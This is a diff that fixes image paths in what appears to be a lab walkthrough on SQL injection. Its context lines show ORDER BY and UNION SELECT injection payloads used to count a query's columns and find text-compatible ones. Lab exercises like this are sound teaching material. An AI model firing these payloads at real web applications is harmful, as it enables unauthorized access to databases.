@@ -34,7 +34,7 @@ For the demonstration of this Lab exercise, I am using the ORDER BY clause.
 ' ORDER BY 1 --
 ```
 
-![](./images/e315e4067a24_001.png)
+![](../images/e315e4067a24_001.png)
 
 ```text
 ' ORDER BY 2 --
@@ -44,13 +44,13 @@ For the demonstration of this Lab exercise, I am using the ORDER BY clause.
 ' ORDER BY 3 --
 ```
 
-![](./images/e315e4067a24_002.png)
+![](../images/e315e4067a24_002.png)
 
 ```text
 ' ORDER BY 4 --
 ```
 
-![](./images/e315e4067a24_003.png)
+![](../images/e315e4067a24_003.png)
 
 ```text
 ' ORDER BY 4 --                          Returns an error message.
@@ -64,13 +64,13 @@ For the demonstration of this Lab exercise, I am using the ORDER BY clause.
 ' UNION SELECT 'a', NULL, NULL --
 ```
 
-![](./images/e315e4067a24_004.png)
+![](../images/e315e4067a24_004.png)
 
 ```text
 ' UNION SELECT NULL, 'a', NULL --
 ```
 
-![](./images/e315e4067a24_005.png)
+![](../images/e315e4067a24_005.png)
 
 ```text
 ' UNION SELECT NULL, NULL, 'a' --
